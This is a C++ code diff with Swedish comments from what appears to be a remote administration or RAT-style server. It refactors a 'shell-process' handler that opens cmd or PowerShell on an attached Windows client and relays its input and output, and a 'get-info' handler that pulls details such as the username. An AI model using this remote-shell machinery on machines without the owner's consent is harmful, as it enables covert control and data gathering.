@@ -189,136 +189,139 @@ func_map server::get_client_commands()
 		} },
 
 		{"shell-process", [&](std::string args) { // skapa en shell interaktiv shell på klienten
-			std::string shell = args;
-			std::string cwd = R"(C:\Windows\System32)";
-			message msg{ "shell-init", "" };
-			if (args == "cmd") {
-				shell = R"(C:\Windows\System32\cmd.exe)";
-			}
-			else if (args == "powershell") {
-				shell = R"(C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe)";
-			}
-			else if (!args.empty()) {
-				auto [shel, cw] = utility::ArgSplit(args, '|');
-				shell = shel;
-				cwd = cw;
-			}
-			else { // om det inte fanns något argument
-				console << "The syntax of the command is incorrect. try -h\n";
-				return;
-			}
-
-			msg.data = shell + "|" + cwd;
-
-			console_log.Log<LOG_INFO>(logger() << str_time() << " Shell-Process-Start\n" << str_time() << "  Process:" << shell  << "\n" << str_time() << "  CWD:" << cwd<< " \n");
-
-			if (send(*attached, msg)) {
-				packet response = wait_response("shell-status", attached); // vänta på konfirmation
-				
-				if (response.data == "OK") {
-					delete_packet(response);
-					console << "(Status) Success: Shell started\n";
-					console_log.Log<LOG_VERBOSE>(logger() << str_time() << " shell_init() - " << Error(0).to_string() << "\n");
-
-					bool dead = false; // process död?
-
-					// Anta att konsolen processen skriver ut något innan man skriver in något. read -> input <- read
-
-					while (!dead && !attached->ip_address.empty()) { // medans processen inte är död och klienten är ansluten
-
-						int threshold = 3; // detta är för att konsolen blir skrivklar innan allt har hunnit skrivas till pipen, därför kräver vi 3 mer läsningar för att kompensera för det
-						int writable = 0; // skrivbar?
-						// Ta emot data
-						while (writable < threshold && !attached->ip_address.empty()) { // medans vi inte kan skriva något tar vi emot data
-							if(send(*attached, { "shell-read", "now" })) { // skicka förfrågan, om lyckas
-								packet respons = wait_response("response|shell-read", attached); // ta emot svar
-
-								auto [status, data] = utility::ArgSplit(respons.data, '|'); // dela status och data från svaret
-
-								//kontrollera status
-								// ready => konsolen behöver input
-								// alive => konsolen är vid liv och kan läasas från
-								// dead  => konsolen är död och kan inte läsas från
-
-								if (status == "ready") { // när vi kan skriva data så behöver vi inte ta emot mer data
-									console_log.Log<LOG_INFO>(logger() << str_time() << " shell_writable() - true" << "\n");
-									writable += 1;
-								}
-								else if (status == "dead") { // när processen dör så behöver vi inte ta emot mer data
-									console_log.Log<LOG_INFO>(logger() << str_time() << " shell() - " << Error(10070, "konsolen dog").to_string() << "\n");
-									dead = true;
-									break;
-								}
-
-								if(status != "dead"){ // status måste vara alive eller ready => printa data
-									console << data;
-								}
-
-								delete_packet(respons); 
-							}
-							else {
-								console << Error(0).to_string() << "\n";
-							}
-						}
-
-						// Skriv ny input till konsol
-						std::string input;
-						if (!attached->ip_address.empty() && !dead) {
-							input = console.input_str(false);
-						}
-						if (!attached->ip_address.empty() && send(*attached, {"shell-write", input + "\n"}) && !dead) { // skicka förfrågan
-							packet respons = wait_response("response|shell-write", attached); // ta emot svar
-							auto [status, data] = utility::ArgSplit(respons.data, '|'); // dela status och data från svaret
-
-							// kontrollera status
-							if (status != "alive" || data != "OK") { // => måste konsolen vara död
-								console_log.Log<LOG_INFO>(logger() << str_time() << " shell() - " << Error(10070, "konsolen dog").to_string() << "\n");
-								dead = true;
-							}
-							else { // => skrivning lyckades
-								console_log.Log<LOG_INFO>(logger() << str_time() << " write-shell() - " << Error(0, "skrev " + data + " till konsolen").to_string() << "\n");
-							}
-						}
-						else { // antar då att send returnerade false alltså SOCKET_ERROR -> död konsol
-							console_log.Log<LOG_INFO>(logger() << str_time() << " shell() - " << Error(10070, "konsolen dog").to_string() << "\n");
-							dead = true;
-						}
-					}
-
-					
-
-					console << "\n\n(Status) Success: Process Exited\n";
+			argument_parser([&](std::string value){
+				std::string shell = args;
+				std::string cwd = R"(C:\Windows\System32)";
+				message msg{ "shell-init", "" };
+				if (args == "cmd") {
+					shell = R"(C:\Windows\System32\cmd.exe)";
 				}
-				else {
-					console << "(Status) Failed: " << response.data << "\n";
-					delete_packet(response);
+				else if (args == "powershell") {
+					shell = R"(C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe)";
+				}
+				else if (!args.empty()) {
+					auto [shel, cw] = utility::ArgSplit(args, '|');
+					shell = shel;
+					cwd = cw;
+				}
+				else { // om det inte fanns något argument
+					console << "The syntax of the command is incorrect. try -h\n";
 					return;
 				}
 
-			}
+				msg.data = shell + "|" + cwd;
+
+				console_log.Log<LOG_INFO>(logger() << str_time() << " Shell-Process-Start\n" << str_time() << "  Process:" << shell << "\n" << str_time() << "  CWD:" << cwd << " \n");
+
+				if (send(*attached, msg)) {
+					packet response = wait_response("shell-status", attached); // vänta på konfirmation
+
+					if (response.data == "OK") {
+						delete_packet(response);
+						console << "(Status) Success: Shell started\n";
+						console_log.Log<LOG_VERBOSE>(logger() << str_time() << " shell_init() - " << Error(0).to_string() << "\n");
+
+						bool dead = false; // process död?
+
+						// Anta att konsolen processen skriver ut något innan man skriver in något. read -> input <- read
+
+						while (!dead && !attached->ip_address.empty()) { // medans processen inte är död och klienten är ansluten
+
+							int threshold = 3; // detta är för att konsolen blir skrivklar innan allt har hunnit skrivas till pipen, därför kräver vi 3 mer läsningar för att kompensera för det
+							int writable = 0; // skrivbar?
+							// Ta emot data
+							while (writable < threshold && !attached->ip_address.empty()) { // medans vi inte kan skriva något tar vi emot data
+								if (send(*attached, { "shell-read", "now" })) { // skicka förfrågan, om lyckas
+									packet respons = wait_response("response|shell-read", attached); // ta emot svar
+
+									auto [status, data] = utility::ArgSplit(respons.data, '|'); // dela status och data från svaret
+
+									//kontrollera status
+									// ready => konsolen behöver input
+									// alive => konsolen är vid liv och kan läasas från
+									// dead  => konsolen är död och kan inte läsas från
+
+									if (status == "ready") { // när vi kan skriva data så behöver vi inte ta emot mer data
+										console_log.Log<LOG_INFO>(logger() << str_time() << " shell_writable() - true" << "\n");
+										writable += 1;
+									}
+									else if (status == "dead") { // när processen dör så behöver vi inte ta emot mer data
+										console_log.Log<LOG_INFO>(logger() << str_time() << " shell() - " << Error(10070, "konsolen dog").to_string() << "\n");
+										dead = true;
+										break;
+									}
+
+									if (status != "dead") { // status måste vara alive eller ready => printa data
+										console << data;
+									}
+
+									delete_packet(respons);
+								}
+								else {
+									console << Error(0).to_string() << "\n";
+								}
+							}
+
+							// Skriv ny input till konsol
+							std::string input;
+							if (!attached->ip_address.empty() && !dead) {
+								input = console.input_str(false);
+							}
+							if (!attached->ip_address.empty() && send(*attached, {"shell-write", input + "\n"}) && !dead) { // skicka förfrågan
+								packet respons = wait_response("response|shell-write", attached); // ta emot svar
+								auto [status, data] = utility::ArgSplit(respons.data, '|'); // dela status och data från svaret
+
+								// kontrollera status
+								if (status != "alive" || data != "OK") { // => måste konsolen vara död
+									console_log.Log<LOG_INFO>(logger() << str_time() << " shell() - " << Error(10070, "konsolen dog").to_string() << "\n");
+									dead = true;
+								}
+								else { // => skrivning lyckades
+									console_log.Log<LOG_INFO>(logger() << str_time() << " write-shell() - " << Error(0, "skrev " + data + " till konsolen").to_string() << "\n");
+								}
+							}
+							else { // antar då att send returnerade false alltså SOCKET_ERROR -> död konsol
+								console_log.Log<LOG_INFO>(logger() << str_time() << " shell() - " << Error(10070, "konsolen dog").to_string() << "\n");
+								dead = true;
+							}
+						}
+
+
+
+						console << "\n\n(Status) Success: Process Exited\n";
+					}
+					else {
+						console << "(Status) Failed: " << response.data << "\n";
+						delete_packet(response);
+						return;
+					}
+				}
+			}, args, "shell-process");
 		}},
 
 		{"get-info", [&](std::string args){ // begär information från klienten
-			for (auto& [information_type, information_dict] : attached->information) { // loopa genom informations kategorierna
-				for (auto& [key, value] : information_dict) { // loopa genom informations queries
-					if (send(*attached, { "info", key })) { // skicka query
-						packet response = wait_response("response|info", attached); // vänta på svar
-						if (response.id.empty() || response.data.empty()) {
-							console << "(Status) Failed: Client Disconnected\n";
-							return;
+			argument_parser([&](std::string value){
+				for (auto& [information_type, information_dict] : attached->information) { // loopa genom informations kategorierna
+					for (auto& [key, value] : information_dict) { // loopa genom informations queries
+						if (send(*attached, { "info", key })) { // skicka query
+							packet response = wait_response("response|info", attached); // vänta på svar
+							if (response.id.empty() || response.data.empty()) {
+								console << "(Status) Failed: Client Disconnected\n";
+								return;
+							}
+
+							std::string response_string = response.data;
+							console_log.Log<LOG_INFO>(logger() << str_time() << " request-info(" << key << ") => " << response_string << "\n");
+
+							value = response_string; // sätt map värdet för querien till svars värdet tex {"Username", ""} => query = ["Username"] svar = ["dfssf"] => {"Username", "dfssf"} 
+
+							delete_packet(response); // ta bort svaret
 						}
-
-						std::string response_string = response.data;
-						console_log.Log<LOG_INFO>(logger() << str_time() << " request-info(" << key << ") => " << response_string << "\n");
-
-						value = response_string; // sätt map värdet för querien till svars värdet tex {"Username", ""} => query = ["Username"] svar = ["dfssf"] => {"Username", "dfssf"} 
-
-						delete_packet(response); // ta bort svaret
+						console_log.draw_element();
 					}
-					console_log.draw_element();
 				}
-			}
-			console << "(Status) Success: Got information\n";
+				console << "(Status) Success: Got information\n";
+			}, args, "get-info");
 		}},
 
 		{ "show-info", [&](std::string args) { // visa akumulerad information om klienten
